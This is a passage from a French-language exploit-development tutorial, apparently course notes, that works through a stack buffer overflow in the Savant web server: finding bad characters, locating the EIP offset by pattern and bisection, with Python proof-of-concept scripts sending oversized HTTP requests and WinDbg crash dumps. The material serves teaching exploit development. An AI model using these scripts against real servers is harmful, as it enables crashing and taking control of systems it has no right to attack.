<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="n">0466eabc</span>  <span class="n">a1</span> <span class="n">a2</span> <span class="n">a3</span> <span class="n">a4</span> <span class="n">a5</span> <span class="n">a6</span> <span class="n">a7</span> <span class="n">a8-a9</span> <span class="n">aa</span> <span class="n">ab</span> <span class="nb">ac </span><span class="n">ad</span> <span class="n">ae</span> <span class="n">af</span> <span class="n">b0</span>  <span class="p">................</span>
<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="n">0466eacc</span>  <span class="n">b1</span> <span class="n">b2</span> <span class="n">b3</span> <span class="n">b4</span> <span class="n">b5</span> <span class="n">b6</span> <span class="n">b7</span> <span class="n">b8-b9</span> <span class="n">ba</span> <span class="n">bb</span> <span class="n">bc</span> <span class="n">bd</span> <span class="n">be</span> <span class="n">bf</span> <span class="n">c0</span>  <span class="p">................</span>
<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="n">0466eadc</span>  <span class="n">c1</span> <span class="n">c2</span> <span class="n">c3</span> <span class="n">c4</span> <span class="n">c5</span> <span class="n">c6</span> <span class="n">c7</span> <span class="n">c8-c9</span> <span class="n">ca</span> <span class="n">cb</span> <span class="n">cc</span> <span class="nb">cd </span><span class="n">ce</span> <span class="n">cf</span> <span class="n">d0</span>  <span class="p">................</span>
<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="n">0466eaec</span>  <span class="n">d1</span> <span class="n">d2</span> <span class="n">d3</span> <span class="n">d4</span> <span class="n">d5</span> <span class="n">d6</span> <span class="n">d7</span> <span class="n">d8-d9</span> <span class="n">da</span> <span class="n">db</span> <span class="n">dc</span> <span class="n">dd</span> <span class="n">de</span> <span class="n">df</span> <span class="n">e0</span>  <span class="p">................</span>
<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="n">0466eafc</span>  <span class="n">e1</span> <span class="n">e2</span> <span class="n">e3</span> <span class="n">e4</span> <span class="n">e5</span> <span class="n">e6</span> <span class="n">e7</span> <span class="n">e8-e9</span> <span class="n">ea</span> <span class="n">eb</span> <span class="n">ec</span> <span class="n">ed</span> <span class="n">ee</span> <span class="n">ef</span> <span class="n">f0</span>  <span class="p">................</span>
<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="n">0466eb0c</span>  <span class="n">f1</span> <span class="n">f2</span> <span class="n">f3</span> <span class="n">f4</span> <span class="n">f5</span> <span class="n">f6</span> <span class="n">f7</span> <span class="n">f8-f9</span> <span class="n">fa</span> <span class="n">fb</span> <span class="nb">fc </span><span class="n">fd</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">41</span>  <span class="p">...............</span><span class="n">A</span>
</code></pre></div>
<p>On continue en décommandant ligne par ligne. On dé-commente donc <code>b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c">#</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">(</span><span class="n">144</span><span class="p">.</span><span class="n">db8</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="p">[...]</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">eax</span><span class="p">=</span><span class="n">ffffffff</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01b15778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">3d909e99</span> <span class="n">edx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">esi</span><span class="p">=</span><span class="n">01b15778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">eip</span><span class="p">=</span><span class="n">41414141</span> <span class="n">esp</span><span class="p">=</span><span class="n">0469ea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">41414141</span> <span class="p">??</span>              <span class="p">???</span>
<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c">#</span>
<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">db</span> <span class="n">esp</span>
<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="n">0469ea2c</span>  <span class="n">41</span> <span class="n">41</span> <span class="n">41</span> <span class="n">00</span> <span class="n">84</span> <span class="n">ea</span> <span class="n">69</span> <span class="n">04</span><span class="p">-</span><span class="n">3c</span> <span class="n">70</span> <span class="n">41</span> <span class="n">00</span> <span class="n">78</span> <span class="n">57</span> <span class="n">b1</span> <span class="n">01</span>  <span class="n">AAA</span><span class="p">...</span><span class="n">i</span><span class="p">.&lt;</span><span class="n">pA</span><span class="p">.</span><span class="n">xW</span><span class="p">..</span>
<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="p">[...]</span>
<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="n">0469ea7c</span>  <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">02</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span><span class="p">-</span><span class="n">47</span> <span class="n">45</span> <span class="n">54</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span>  <span class="p">........</span><span class="n">GET</span><span class="p">.....</span>
<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="n">0469ea8c</span>  <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span><span class="p">-</span><span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span>  <span class="p">................</span>
<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="n">0469ea9c</span>  <span class="n">2f</span> <span class="n">75</span> <span class="n">76</span> <span class="n">77</span> <span class="n">78</span> <span class="n">79</span> <span class="n">7a</span> <span class="n">7b</span><span class="p">-</span><span class="n">7c</span> <span class="n">7d</span> <span class="n">7e</span> <span class="n">7f</span> <span class="n">80</span> <span class="n">81</span> <span class="n">82</span> <span class="n">83</span>  <span class="p">/</span><span class="n">uvwxyz</span><span class="p">{|}~.....</span> <span class="c"># Commence ici</span>
</code></pre></div>
<p>On a encore tous les caractères, on continue ligne par ligne en remontant vers le haut.</p>
<p>Quand on arrive a la ligne <code>b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"</code> l'overflow est différent. <code>EIP</code> n'est pas réécrit.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">(</span><span class="n">10e4</span><span class="p">.</span><span class="n">bc8</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="p">[...]</span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">045a0041</span> <span class="n">ebx</span><span class="p">=</span><span class="n">001a5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">00000001</span> <span class="n">edx</span><span class="p">=</span><span class="n">00020b40</span> <span class="n">esi</span><span class="p">=</span><span class="n">001a5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">0040c05f</span> <span class="n">esp</span><span class="p">=</span><span class="n">045ae6b8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">045aea24</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010246</span>
<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0xc05f</span><span class="p">:</span>
<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">0040c05f</span> <span class="n">8b08</span>            <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="no">[eax]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">045a0041</span><span class="p">=????????</span>
</code></pre></div>
<p>Il y a donc un mauvais caractère dans cette ligne :</p>
<ul>
<li>Si on enlève <code>\x26</code> on a un dépassement de tampon, mais qui ne réécrit pas <code>EIP</code>, indiquant que le mauvais caractère est toujours la</li>
<li>Si on élève <code>\x25</code> on a un  dépassement de tampon qui réécrit le <code>EIP</code></li>
<li>C'est donc un mauvais caractère</li>
</ul>
<p>On continue jusqu'à remonter à la première ligne. Les mauvais caractères identifient sont : <code>0x00</code> - <code>0x0D</code> - <code>0x0A</code> - <code>0x25</code></p>
<h3 id="determiner-loffset-exact">Déterminer l'offset exact</h3>
<p>Une fois de plus, on veut identifier l'offset exact qui réécrit <code>EIP</code>. On génère un pattern unique :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)-[/</span><span class="n">media</span><span class="p">/</span><span class="err">…</span><span class="p">/</span><span class="n">os</span><span class="p">/</span><span class="n">exp</span><span class="p">-</span><span class="n">301-osed</span><span class="p">/</span><span class="n">cours</span><span class="p">/</span><span class="n">cours6</span><span class="p">]</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="err">└─</span><span class="p">$</span> <span class="n">msf-pattern_create</span> <span class="n">-l</span> <span class="n">260</span> 
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai</span>
</code></pre></div>
<p>On met a jour la preuve d'exploitation :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">260</span>
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai&quot;</span>
<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span>
</code></pre></div>
<p>L'exécution de la preuve de concept entraine un dépassement de tampon, mais <code>EIP</code> n'est pas réécrit par un <em>pattern</em> unique :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">(</span><span class="n">1210</span><span class="p">.</span><span class="n">132c</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="p">[...]</span>
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">00694135</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01935778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">de4eadbe</span> <span class="n">edx</span><span class="p">=</span><span class="n">00000001</span> <span class="n">esi</span><span class="p">=</span><span class="n">01935778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">0040c05f</span> <span class="n">esp</span><span class="p">=</span><span class="n">045ee6b8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">045eea24</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010246</span>
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0xc05f</span><span class="p">:</span>
<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">0040c05f</span> <span class="n">8b08</span>            <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="no">[eax]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">00694135</span><span class="p">=????????</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)-[/</span><span class="n">media</span><span class="p">/</span><span class="err">…</span><span class="p">/</span><span class="n">os</span><span class="p">/</span><span class="n">exp</span><span class="p">-</span><span class="n">301-osed</span><span class="p">/</span><span class="n">cours</span><span class="p">/</span><span class="n">cours6</span><span class="p">]</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="err">└─</span><span class="p">$</span> <span class="n">msf-pattern_offset</span> <span class="n">-l</span> <span class="n">260</span> <span class="n">-q</span> <span class="n">0040c05f</span> 
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="p">[*]</span> <span class="n">No</span> <span class="n">exact</span> <span class="n">matches</span><span class="p">,</span> <span class="n">looking</span> <span class="k">for</span> <span class="n">likely</span> <span class="n">candidates</span><span class="p">...</span>
</code></pre></div>
<p>On opte donc pour l'identification manuelle de l'offset à travers de la dichotomie.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">260</span>
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">130</span>
<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">130</span>
<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span>
</code></pre></div>
<p>Le registre <code>EIP</code> est à <code>42424242</code>. Indiquant que le dépassement de tampon est donc dans la deuxième moitié.</p>
<p>On continus dans la dichotomie :</p>
<ul>
<li>On augmente de la moitié de 130 le nombre de <code>A</code></li>
<li>On diminue de moitié le nombre de <code>B</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">195</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">65</span>
</code></pre></div>
<p>Le dépassement se situe toujours dans la deuxième partie :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">(</span><span class="n">e04</span><span class="p">.</span><span class="n">12d8</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Savant</span><span class="p">\</span><span class="n">Savant</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">eax</span><span class="p">=</span><span class="n">ffffffff</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018c5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">0bc8af86</span> <span class="n">edx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">esi</span><span class="p">=</span><span class="n">018c5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">eip</span><span class="p">=</span><span class="n">42424242</span> <span class="n">esp</span><span class="p">=</span><span class="n">045cea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">42424242</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">42424242</span> <span class="p">??</span>              <span class="p">???</span>
</code></pre></div>
<p>On continue de cette manière jusqu'à arriver à la configuration suivante :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">253</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42\x42\x42\x42</span><span class="s2">&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="p">(</span><span class="n">168c</span><span class="p">.</span><span class="n">16c4</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="p">[...]</span>
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">ffffffff</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01995778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">58fe6b05</span> <span class="n">edx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">esi</span><span class="p">=</span><span class="n">01995778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">42424242</span> <span class="n">esp</span><span class="p">=</span><span class="n">0461ea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
